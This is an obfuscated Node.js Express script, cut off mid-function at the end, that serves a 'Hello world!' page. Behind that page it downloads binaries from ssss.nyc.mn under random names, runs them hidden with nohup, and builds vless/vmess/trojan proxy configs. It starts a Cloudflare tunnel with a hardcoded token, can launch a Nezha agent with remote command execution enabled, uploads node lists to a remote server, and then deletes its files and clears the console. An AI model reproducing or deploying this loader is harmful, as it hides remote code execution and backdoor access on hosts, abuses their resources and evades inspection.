const _0x1fc5c7=_0x5b1a;(function(_0x34dda4,_0x2c71eb){const _0xd4901b=_0x5b1a,_0x2c50e9=_0x34dda4();while(!![]){try{const _0x4ea7f1=-parseInt(_0xd4901b(0x158))/0x1+parseInt(_0xd4901b(0x1e7))/0x2*(-parseInt(_0xd4901b(0x172))/0x3)+-parseInt(_0xd4901b(0x161))/0x4*(parseInt(_0xd4901b(0x189))/0x5)+-parseInt(_0xd4901b(0x1f8))/0x6*(parseInt(_0xd4901b(0x1c5))/0x7)+parseInt(_0xd4901b(0x1a4))/0x8*(parseInt(_0xd4901b(0x1c3))/0x9)+parseInt(_0xd4901b(0x19f))/0xa+parseInt(_0xd4901b(0x19d))/0xb;if(_0x4ea7f1===_0x2c71eb)break;else _0x2c50e9['push'](_0x2c50e9['shift']());}catch(_0x20ef9e){_0x2c50e9['push'](_0x2c50e9['shift']());}}}(_0xa4cd,0xe1f06));const express=require(_0x1fc5c7(0x1e9)),app=express(),axios=require(_0x1fc5c7(0x1cc)),os=require('os'),fs=require('fs'),path=require(_0x1fc5c7(0x1f7)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x1fc5c7(0x196)]),{execSync}=require(_0x1fc5c7(0x1ca)),UPLOAD_URL=process[_0x1fc5c7(0x1fc)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x1fc5c7(0x1fc)][_0x1fc5c7(0x177)]||'',AUTO_ACCESS=process['env'][_0x1fc5c7(0x162)]||![],FILE_PATH=process[_0x1fc5c7(0x1fc)][_0x1fc5c7(0x159)]||'./tmp',SUB_PATH=process[_0x1fc5c7(0x1fc)][_0x1fc5c7(0x1d9)]||_0x1fc5c7(0x17b),PORT=process[_0x1fc5c7(0x1fc)]['SERVER_PORT']||process['env'][_0x1fc5c7(0x16c)]||0xbb8,UUID=process[_0x1fc5c7(0x1fc)]['UUID']||'cda9b52a-2339-408f-8459-65bf42f2e57f',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1fc5c7(0x1fc)][_0x1fc5c7(0x193)]||'',NEZHA_KEY=process[_0x1fc5c7(0x1fc)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x1fc5c7(0x1fc)][_0x1fc5c7(0x165)]||_0x1fc5c7(0x1d3),ARGO_AUTH=process['env'][_0x1fc5c7(0x1d7)]||_0x1fc5c7(0x157),ARGO_PORT=process[_0x1fc5c7(0x1fc)][_0x1fc5c7(0x174)]||0x1f41,CFIP=process[_0x1fc5c7(0x1fc)][_0x1fc5c7(0x1ac)]||'cdns.doon.eu.org',CFPORT=process[_0x1fc5c7(0x1fc)][_0x1fc5c7(0x16b)]||0x1bb,NAME=process[_0x1fc5c7(0x1fc)]['NAME']||'jt';!fs['existsSync'](FILE_PATH)?(fs[_0x1fc5c7(0x1bf)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x1fc5c7(0x1c6)](FILE_PATH+_0x1fc5c7(0x163));function generateRandomName(){const _0x3f7d71=_0x1fc5c7,_0xa2ce8d=_0x3f7d71(0x1db);let _0x5076e6='';for(let _0x5488a8=0x0;_0x5488a8<0x6;_0x5488a8++){_0x5076e6+=_0xa2ce8d[_0x3f7d71(0x190)](Math['floor'](Math[_0x3f7d71(0x1de)]()*_0xa2ce8d[_0x3f7d71(0x186)]));}return _0x5076e6;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1fc5c7(0x171)](FILE_PATH,npmName),phpPath=path[_0x1fc5c7(0x171)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x1fc5c7(0x171)](FILE_PATH,_0x1fc5c7(0x14e)),listPath=path[_0x1fc5c7(0x171)](FILE_PATH,'list.txt'),bootLogPath=path[_0x1fc5c7(0x171)](FILE_PATH,_0x1fc5c7(0x188)),configPath=path[_0x1fc5c7(0x171)](FILE_PATH,'config.json');function deleteNodes(){const _0xae5c01=_0x1fc5c7;try{if(!UPLOAD_URL)return;if(!fs[_0xae5c01(0x181)](subPath))return;let _0x274f60;try{_0x274f60=fs[_0xae5c01(0x1f6)](subPath,_0xae5c01(0x1af));}catch{return null;}const _0x5e1c83=Buffer['from'](_0x274f60,'base64')[_0xae5c01(0x16f)](_0xae5c01(0x1af)),_0x4a08ac=_0x5e1c83[_0xae5c01(0x19e)]('\x0a')[_0xae5c01(0x1bc)](_0x27866d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xae5c01(0x1ef)](_0x27866d));if(_0x4a08ac[_0xae5c01(0x186)]===0x0)return;return axios[_0xae5c01(0x1d5)](UPLOAD_URL+_0xae5c01(0x16a),JSON[_0xae5c01(0x1b8)]({'nodes':_0x4a08ac}),{'headers':{'Content-Type':'application/json'}})[_0xae5c01(0x1ec)](_0x3f5a64=>{return null;}),null;}catch(_0xe6c133){return null;}}function cleanupOldFiles(){const _0x288213=_0x1fc5c7;try{const _0x29c7a0=fs[_0x288213(0x1a1)](FILE_PATH);_0x29c7a0[_0x288213(0x164)](_0x4c1a8e=>{const _0x3a2c2e=_0x288213,_0x528498=path[_0x3a2c2e(0x171)](FILE_PATH,_0x4c1a8e);try{const _0x29a2c1=fs[_0x3a2c2e(0x170)](_0x528498);_0x29a2c1[_0x3a2c2e(0x182)]()&&fs['unlinkSync'](_0x528498);}catch(_0x250676){}});}catch(_0x298b49){}}app['get']('/',function(_0x131227,_0x8fac17){const _0x15afda=_0x1fc5c7;_0x8fac17[_0x15afda(0x16d)](_0x15afda(0x194));});async function generateConfig(){const _0x1e382d=_0x1fc5c7,_0x5e08f7={'log':{'access':_0x1e382d(0x166),'error':_0x1e382d(0x166),'loglevel':_0x1e382d(0x148)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x1e382d(0x1fb)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x1e382d(0x200),'dest':0xbbb},{'path':_0x1e382d(0x15e),'dest':0xbbc}]},'streamSettings':{'network':_0x1e382d(0x197)}},{'port':0xbb9,'listen':_0x1e382d(0x1fa),'protocol':_0x1e382d(0x1fe),'settings':{'clients':[{'id':UUID}],'decryption':_0x1e382d(0x148)},'streamSettings':{'network':_0x1e382d(0x197),'security':_0x1e382d(0x148)}},{'port':0xbba,'listen':_0x1e382d(0x1fa),'protocol':_0x1e382d(0x1fe),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1e382d(0x148)},'streamSettings':{'network':'ws','security':_0x1e382d(0x148),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1e382d(0x1b9),_0x1e382d(0x1b4),_0x1e382d(0x151)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1e382d(0x1fa),'protocol':_0x1e382d(0x144),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1e382d(0x200)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1e382d(0x1b4),_0x1e382d(0x151)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1e382d(0x1fa),'protocol':_0x1e382d(0x1f0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1e382d(0x148),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1e382d(0x1b9),_0x1e382d(0x1b4),_0x1e382d(0x151)],'metadataOnly':![]}}],'dns':{'servers':[_0x1e382d(0x1aa)]},'outbounds':[{'protocol':_0x1e382d(0x17f),'tag':'direct'},{'protocol':_0x1e382d(0x1b7),'tag':_0x1e382d(0x15b)}]};fs[_0x1e382d(0x149)](path[_0x1e382d(0x171)](FILE_PATH,_0x1e382d(0x1a0)),JSON[_0x1e382d(0x1b8)](_0x5e08f7,null,0x2));}function getSystemArchitecture(){const _0x3a397b=_0x1fc5c7,_0x47e8bf=os[_0x3a397b(0x1da)]();return _0x47e8bf===_0x3a397b(0x1eb)||_0x47e8bf===_0x3a397b(0x184)||_0x47e8bf===_0x3a397b(0x1c1)?_0x3a397b(0x1eb):_0x3a397b(0x1ad);}function downloadFile(_0x4c7185,_0x16ad8d,_0x5571d1){const _0x3c8def=_0x1fc5c7,_0xfb2ade=_0x4c7185;!fs['existsSync'](FILE_PATH)&&fs[_0x3c8def(0x1bf)](FILE_PATH,{'recursive':!![]});const _0xc93f5d=fs[_0x3c8def(0x1cd)](_0xfb2ade);axios({'method':_0x3c8def(0x1cb),'url':_0x16ad8d,'responseType':'stream'})['then'](_0x5c9da0=>{const _0x179e9a=_0x3c8def;_0x5c9da0[_0x179e9a(0x1f5)][_0x179e9a(0x1f3)](_0xc93f5d),_0xc93f5d['on'](_0x179e9a(0x167),()=>{const _0x5aec73=_0x179e9a;_0xc93f5d[_0x5aec73(0x1d8)](),console[_0x5aec73(0x1c6)]('Download\x20'+path['basename'](_0xfb2ade)+_0x5aec73(0x1a2)),_0x5571d1(null,_0xfb2ade);}),_0xc93f5d['on'](_0x179e9a(0x1a3),_0x38856c=>{const _0x27a792=_0x179e9a;fs[_0x27a792(0x178)](_0xfb2ade,()=>{});const _0x47e731=_0x27a792(0x1c4)+path[_0x27a792(0x1b6)](_0xfb2ade)+_0x27a792(0x185)+_0x38856c[_0x27a792(0x1bd)];console[_0x27a792(0x1a3)](_0x47e731),_0x5571d1(_0x47e731);});})[_0x3c8def(0x1ec)](_0x33a8fa=>{const _0x6372bd=_0x3c8def,_0x5f10cb=_0x6372bd(0x1c4)+path[_0x6372bd(0x1b6)](_0xfb2ade)+_0x6372bd(0x185)+_0x33a8fa[_0x6372bd(0x1bd)];console[_0x6372bd(0x1a3)](_0x5f10cb),_0x5571d1(_0x5f10cb);});}async function downloadFilesAndRun(){const _0x2bfd52=_0x1fc5c7,_0x117cb2=getSystemArchitecture(),_0x651930=getFilesForArchitecture(_0x117cb2);if(_0x651930[_0x2bfd52(0x186)]===0x0){console[_0x2bfd52(0x1c6)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x26c234=_0x651930['map'](_0x52e897=>{return new Promise((_0x48eb5a,_0x1ab297)=>{const _0x5d39f8=_0x5b1a;downloadFile(_0x52e897[_0x5d39f8(0x1c0)],_0x52e897[_0x5d39f8(0x1e0)],(_0x2428c5,_0x388cdc)=>{_0x2428c5?_0x1ab297(_0x2428c5):_0x48eb5a(_0x388cdc);});});});try{await Promise[_0x2bfd52(0x1d1)](_0x26c234);}catch(_0x436833){console['error'](_0x2bfd52(0x173),_0x436833);return;}function _0x505983(_0x5c6073){const _0x39e262=0x1fd;_0x5c6073['forEach'](_0x58647b=>{const _0x26392b=_0x5b1a;fs[_0x26392b(0x181)](_0x58647b)&&fs[_0x26392b(0x1fd)](_0x58647b,_0x39e262,_0x48f777=>{const _0x52ba62=_0x26392b;_0x48f777?console['error'](_0x52ba62(0x179)+_0x58647b+':\x20'+_0x48f777):console[_0x52ba62(0x1c6)](_0x52ba62(0x1c9)+_0x58647b+':\x20'+_0x39e262[_0x52ba62(0x16f)](0x8));});});}const _0x2260d6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x505983(_0x2260d6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1824a9=NEZHA_SERVER[_0x2bfd52(0x1e5)](':')?NEZHA_SERVER[_0x2bfd52(0x19e)](':')['pop']():'',_0x3e486a=new Set([_0x2bfd52(0x198),_0x2bfd52(0x15d),_0x2bfd52(0x1d0),_0x2bfd52(0x17c),_0x2bfd52(0x1ae),_0x2bfd52(0x183)]),_0x27b5cb=_0x3e486a[_0x2bfd52(0x1a6)](_0x1824a9)?_0x2bfd52(0x1dc):'false',_0x3170dc=_0x2bfd52(0x168)+NEZHA_KEY+_0x2bfd52(0x18c)+NEZHA_SERVER+_0x2bfd52(0x156)+_0x27b5cb+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2bfd52(0x149)](path['join'](FILE_PATH,_0x2bfd52(0x1e4)),_0x3170dc);const _0x315027='nohup\x20'+phpPath+_0x2bfd52(0x1b2)+FILE_PATH+_0x2bfd52(0x1ab);try{await exec(_0x315027),console[_0x2bfd52(0x1c6)](phpName+_0x2bfd52(0x18f)),await new Promise(_0x2f1a61=>setTimeout(_0x2f1a61,0x3e8));}catch(_0x32cf01){console['error'](_0x2bfd52(0x18e)+_0x32cf01);}}else{let _0x454aab='';const _0x176bc2=[_0x2bfd52(0x198),'8443',_0x2bfd52(0x1d0),'2087',_0x2bfd52(0x1ae),'2053'];_0x176bc2[_0x2bfd52(0x1e5)](NEZHA_PORT)&&(_0x454aab=_0x2bfd52(0x1b3));const _0x128962=_0x2bfd52(0x18d)+npmPath+_0x2bfd52(0x1bb)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2bfd52(0x1f4)+NEZHA_KEY+'\x20'+_0x454aab+_0x2bfd52(0x154);try{await exec(_0x128962),console[_0x2bfd52(0x1c6)](npmName+_0x2bfd52(0x18f)),await new Promise(_0x2ff4d2=>setTimeout(_0x2ff4d2,0x3e8));}catch(_0x1dfd26){console['error']('npm\x20running\x20error:\x20'+_0x1dfd26);}}}else console[_0x2bfd52(0x1c6)](_0x2bfd52(0x1f1));const _0x2faad5='nohup\x20'+webPath+_0x2bfd52(0x1c2)+FILE_PATH+_0x2bfd52(0x19b);try{await exec(_0x2faad5),console['log'](webName+_0x2bfd52(0x18f)),await new Promise(_0x14314e=>setTimeout(_0x14314e,0x3e8));}catch(_0x422d5f){console[_0x2bfd52(0x1a3)](_0x2bfd52(0x15c)+_0x422d5f);}if(fs[_0x2bfd52(0x181)](botPath)){let _0x33f79a;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x33f79a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x33f79a=_0x2bfd52(0x192)+FILE_PATH+'/tunnel.yml\x20run':_0x33f79a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2bfd52(0x18d)+botPath+'\x20'+_0x33f79a+_0x2bfd52(0x187)),console[_0x2bfd52(0x1c6)](botName+'\x20is\x20running'),await new Promise(_0x5df448=>setTimeout(_0x5df448,0x7d0));}catch(_0x266463){console[_0x2bfd52(0x1a3)](_0x2bfd52(0x180)+_0x266463);}}await new Promise(_0x402d71=>setTimeout(_0x402d71,0x1388));}function _0xa4cd(){const _0x56032b=['filter','message','set','mkdirSync','fileName','aarch64','\x20-c\x20','1519011PwCgDc','Download\x20','14XfSHfD','log','base64','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Empowerment\x20success\x20for\x20','child_process','get','axios','createWriteStream','substring','&path=%2Ftrojan-argo%3Fed%3D2560#','2096','all','Content-Type','230000.jtzz.de5.net','ARGO_DOMAIN:','post','Subscription\x20uploaded\x20successfully','ARGO_AUTH','close','SUB_PATH','arch','abcdefghijklmnopqrstuvwxyz','true','status','random','country_code','fileUrl','/api/add-subscriptions','listen','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','config.yaml','includes','&fp=firefox&type=ws&host=','80uvzsOd','taskkill\x20/f\x20/im\x20','express','https://amd64.ssss.nyc.mn/v1','arm','catch','del\x20/f\x20/q\x20','&path=%2Fvless-argo%3Fed%3D2560#','test','trojan','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://ipapi.co/json/','pipe','\x20-p\x20','data','readFileSync','path','2543598SyTzKs','tunnel.json','127.0.0.1','xtls-rprx-vision','env','chmod','vless','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/vmess-argo','automatic\x20access\x20task\x20added\x20successfully','vmess','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','http://ip-api.com/json/','\x20>\x20nul\x202>&1','none','writeFileSync','success','Add\x20automatic\x20access\x20task\x20faild:\x20','https://oooo.serv00.net/add-url','win32','sub.txt','push','\x0avless://','quic','https://arm64.ssss.nyc.mn/web','/vmess-argo?ed=2560','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','response','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','eyJhIjoiZmQ5NmE1ZDJkYTJhYzA2MTNiNTUyZDBkYmRkNzgwMTciLCJ0IjoiYTRiMTRmNjgtYWFjMi00ODkxLThmMjYtNmYzZGRlZTYzYzg3IiwicyI6Ik5USmlNelExT0dRdFlUTm1NeTAwTURnMExXSTROall0WTJJM09UVTBNalpsWW1abCJ9','37576qTtsFI','FILE_PATH','clear','block','web\x20running\x20error:\x20','8443','/trojan-argo','\x0a\x0avmess://','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','4hKOhAV','AUTO_ACCESS','\x20already\x20exists','forEach','ARGO_DOMAIN','/dev/null','finish','\x0aclient_secret:\x20','countryCode','/api/delete-nodes','CFPORT','PORT','send','org','toString','statSync','join','29838DaepCn','Error\x20downloading\x20files:','ARGO_PORT','\x0a\x20\x20tunnel:\x20','from','PROJECT_URL','unlink','Empowerment\x20failed\x20for\x20','Unknown','sub','2087','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','freedom','Error\x20executing\x20command:\x20','existsSync','isFile','2053','arm64','\x20failed:\x20','length','\x20>/dev/null\x202>&1\x20&','boot.log','3523595JNsJBs','\x0a\x0atrojan://','tunnel.yml','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','nohup\x20','php\x20running\x20error:\x20','\x20is\x20running','charAt','Nodes\x20uploaded\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','NEZHA_PORT','Hello\x20world!','platform','exec','tcp','443','rm\x20-rf\x20','ArgoDomain:','/config.json\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','2710400vzIunF','split','16543730CCrErO','config.json','readdirSync','\x20successfully','error','48qjRlvm','TunnelSecret','has','\x0a\x20\x20credentials-file:\x20','App\x20is\x20running','unshift','https+local://8.8.8.8/dns-query','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','CFIP','amd','2083','utf-8','https://arm64.ssss.nyc.mn/bot','Error\x20in\x20startserver:','\x20-c\x20\x22','--tls','tls','https://arm64.ssss.nyc.mn/v1','basename','blackhole','stringify','http','application/json','\x20-s\x20'];_0xa4cd=function(){return _0x56032b;};return _0xa4cd();}function getFilesForArchitecture(_0x573477){const _0x155077=_0x1fc5c7;let _0x5145c0;_0x573477===_0x155077(0x1eb)?_0x5145c0=[{'fileName':webPath,'fileUrl':_0x155077(0x152)},{'fileName':botPath,'fileUrl':_0x155077(0x1b0)}]:_0x5145c0=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xa362bf=_0x573477===_0x155077(0x1eb)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x5145c0['unshift']({'fileName':npmPath,'fileUrl':_0xa362bf});}else{const _0x139cba=_0x573477===_0x155077(0x1eb)?_0x155077(0x1b5):_0x155077(0x1ea);_0x5145c0[_0x155077(0x1a9)]({'fileName':phpPath,'fileUrl':_0x139cba});}}return _0x5145c0;}function argoType(){const _0xd3bdd3=_0x1fc5c7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xd3bdd3(0x1c6)](_0xd3bdd3(0x19c));return;}if(ARGO_AUTH[_0xd3bdd3(0x1e5)](_0xd3bdd3(0x1a5))){fs[_0xd3bdd3(0x149)](path['join'](FILE_PATH,_0xd3bdd3(0x1f9)),ARGO_AUTH);const _0x121e8f=_0xd3bdd3(0x175)+ARGO_AUTH['split']('\x22')[0xb]+_0xd3bdd3(0x1a7)+path[_0xd3bdd3(0x171)](FILE_PATH,_0xd3bdd3(0x1f9))+_0xd3bdd3(0x17d)+ARGO_DOMAIN+_0xd3bdd3(0x17e)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0xd3bdd3(0x149)](path[_0xd3bdd3(0x171)](FILE_PATH,_0xd3bdd3(0x18b)),_0x121e8f);}else console[_0xd3bdd3(0x1c6)](_0xd3bdd3(0x160));}async function extractDomains(){const _0x4a42f2=_0x1fc5c7;let _0x3adc9d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3adc9d=ARGO_DOMAIN,console[_0x4a42f2(0x1c6)](_0x4a42f2(0x1d4),_0x3adc9d),await _0x1694eb(_0x3adc9d);else try{const _0x3dcaa8=fs[_0x4a42f2(0x1f6)](path[_0x4a42f2(0x171)](FILE_PATH,_0x4a42f2(0x188)),_0x4a42f2(0x1af)),_0x772209=_0x3dcaa8[_0x4a42f2(0x19e)]('\x0a'),_0x1f2203=[];_0x772209['forEach'](_0x1885a2=>{const _0x519ebd=_0x4a42f2,_0x5ba156=_0x1885a2['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5ba156){const _0x5eb19c=_0x5ba156[0x1];_0x1f2203[_0x519ebd(0x14f)](_0x5eb19c);}});if(_0x1f2203['length']>0x0)_0x3adc9d=_0x1f2203[0x0],console[_0x4a42f2(0x1c6)](_0x4a42f2(0x19a),_0x3adc9d),await _0x1694eb(_0x3adc9d);else{console[_0x4a42f2(0x1c6)](_0x4a42f2(0x145)),fs['unlinkSync'](path[_0x4a42f2(0x171)](FILE_PATH,'boot.log'));async function _0x13dc7f(){const _0xa5b26a=_0x4a42f2;try{process[_0xa5b26a(0x195)]===_0xa5b26a(0x14d)?await exec(_0xa5b26a(0x1e8)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0xa5b26a(0x190)](0x0)+']'+botName[_0xa5b26a(0x1ce)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3575a2){}}_0x13dc7f(),await new Promise(_0x398e11=>setTimeout(_0x398e11,0xbb8));const _0x17b602=_0x4a42f2(0x1e3)+FILE_PATH+_0x4a42f2(0x1ff)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x17b602+'\x20>/dev/null\x202>&1\x20&'),console[_0x4a42f2(0x1c6)](botName+_0x4a42f2(0x18f)),await new Promise(_0x16c77b=>setTimeout(_0x16c77b,0xbb8)),await extractDomains();}catch(_0x2daa7a){console[_0x4a42f2(0x1a3)](_0x4a42f2(0x180)+_0x2daa7a);}}}catch(_0x119159){console['error']('Error\x20reading\x20boot.log:',_0x119159);}async function _0x46dd4f(){const _0x2e6014=_0x4a42f2;try{const _0x265e37=await axios[_0x2e6014(0x1cb)](_0x2e6014(0x1f2),{'timeout':0xbb8});if(_0x265e37[_0x2e6014(0x1f5)]&&_0x265e37[_0x2e6014(0x1f5)][_0x2e6014(0x1df)]&&_0x265e37[_0x2e6014(0x1f5)]['org'])return _0x265e37[_0x2e6014(0x1f5)][_0x2e6014(0x1df)]+'_'+_0x265e37[_0x2e6014(0x1f5)]['org'];}catch(_0x7bc233){try{const _0x31fe72=await axios[_0x2e6014(0x1cb)](_0x2e6014(0x146),{'timeout':0xbb8});if(_0x31fe72[_0x2e6014(0x1f5)]&&_0x31fe72[_0x2e6014(0x1f5)]['status']===_0x2e6014(0x14a)&&_0x31fe72['data'][_0x2e6014(0x169)]&&_0x31fe72['data'][_0x2e6014(0x16e)])return _0x31fe72[_0x2e6014(0x1f5)][_0x2e6014(0x169)]+'_'+_0x31fe72[_0x2e6014(0x1f5)]['org'];}catch(_0x40acc0){}}return _0x2e6014(0x17a);}async function _0x1694eb(_0x297d63){const _0x2edada=await _0x46dd4f(),_0x562448=NAME?NAME+'-'+_0x2edada:_0x2edada;return new Promise(_0x5db6ff=>{setTimeout(()=>{const _0x14b5cb=_0x5b1a,_0x4997cb={'v':'2','ps':''+_0x562448,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x14b5cb(0x148),'net':'ws','type':_0x14b5cb(0x148),'host':_0x297d63,'path':_0x14b5cb(0x153),'tls':_0x14b5cb(0x1b4),'sni':_0x297d63,'alpn':'','fp':'firefox'},_0x3f97c0=_0x14b5cb(0x150)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x297d63+_0x14b5cb(0x1e6)+_0x297d63+_0x14b5cb(0x1ee)+_0x562448+_0x14b5cb(0x15f)+Buffer[_0x14b5cb(0x176)](JSON[_0x14b5cb(0x1b8)](_0x4997cb))['toString']('base64')+_0x14b5cb(0x18a)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x297d63+_0x14b5cb(0x1e6)+_0x297d63+_0x14b5cb(0x1cf)+_0x562448+'\x0a\x20\x20\x20\x20';console[_0x14b5cb(0x1c6)](Buffer['from'](_0x3f97c0)['toString']('base64')),fs[_0x14b5cb(0x149)](subPath,Buffer[_0x14b5cb(0x176)](_0x3f97c0)[_0x14b5cb(0x16f)](_0x14b5cb(0x1c7))),console[_0x14b5cb(0x1c6)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x14b5cb(0x1cb)]('/'+SUB_PATH,(_0xedc473,_0x222d44)=>{const _0x22f823=_0x14b5cb,_0x2b9254=Buffer[_0x22f823(0x176)](_0x3f97c0)['toString'](_0x22f823(0x1c7));_0x222d44[_0x22f823(0x1be)](_0x22f823(0x1d2),'text/plain;\x20charset=utf-8'),_0x222d44[_0x22f823(0x16d)](_0x2b9254);}),_0x5db6ff(_0x3f97c0);},0x7d0);});}}async function uploadNodes(){const _0x19a351=_0x1fc5c7;if(UPLOAD_URL&&PROJECT_URL){const _0x358879=PROJECT_URL+'/'+SUB_PATH,_0xa4586c={'subscription':[_0x358879]};try{const _0x1611a1=await axios['post'](UPLOAD_URL+_0x19a351(0x1e1),_0xa4586c,{'headers':{'Content-Type':'application/json'}});return _0x1611a1&&_0x1611a1['status']===0xc8?(console[_0x19a351(0x1c6)](_0x19a351(0x1d6)),_0x1611a1):null;}catch(_0xc1b8f8){if(_0xc1b8f8['response']){if(_0xc1b8f8[_0x19a351(0x155)][_0x19a351(0x1dd)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x19a351(0x181)](listPath))return;const _0x3ac8ec=fs[_0x19a351(0x1f6)](listPath,_0x19a351(0x1af)),_0x304dbb=_0x3ac8ec[_0x19a351(0x19e)]('\x0a')[_0x19a351(0x1bc)](_0x1f2e9f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x19a351(0x1ef)](_0x1f2e9f));if(_0x304dbb['length']===0x0)return;const _0x5cc97a=JSON[_0x19a351(0x1b8)]({'nodes':_0x304dbb});try{const _0xeabd1c=await axios[_0x19a351(0x1d5)](UPLOAD_URL+'/api/add-nodes',_0x5cc97a,{'headers':{'Content-Type':_0x19a351(0x1ba)}});return _0xeabd1c&&_0xeabd1c[_0x19a351(0x1dd)]===0xc8?(console[_0x19a351(0x1c6)](_0x19a351(0x191)),_0xeabd1c):null;}catch(_0x465906){return null;}}else return;}}function _0x5b1a(_0xb8cf11,_0x5324a4){_0xb8cf11=_0xb8cf11-0x144;const _0xa4cd9a=_0xa4cd();let _0x5b1a13=_0xa4cd9a[_0xb8cf11];return _0x5b1a13;}function cleanFiles(){setTimeout(()=>{const _0x26ab1c=_0x5b1a,_0x596f2d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x596f2d[_0x26ab1c(0x14f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x596f2d[_0x26ab1c(0x14f)](phpPath);process[_0x26ab1c(0x195)]==='win32'?exec(_0x26ab1c(0x1ed)+_0x596f2d['join']('\x20')+_0x26ab1c(0x147),_0x2e2711=>{const _0x25ddad=_0x26ab1c;console[_0x25ddad(0x15a)](),console['log'](_0x25ddad(0x1a8)),console[_0x25ddad(0x1c6)](_0x25ddad(0x1c8));}):exec(_0x26ab1c(0x199)+_0x596f2d[_0x26ab1c(0x171)]('\x20')+'\x20>/dev/null\x202>&1',_0x33d102=>{const _0x3edb60=_0x26ab1c;console[_0x3edb60(0x15a)](),console[_0x3edb60(0x1c6)](_0x3edb60(0x1a8)),console[_0x3edb60(0x1c6)](_0x3edb60(0x1c8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x281ffd=_0x1fc5c7;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x401475=await 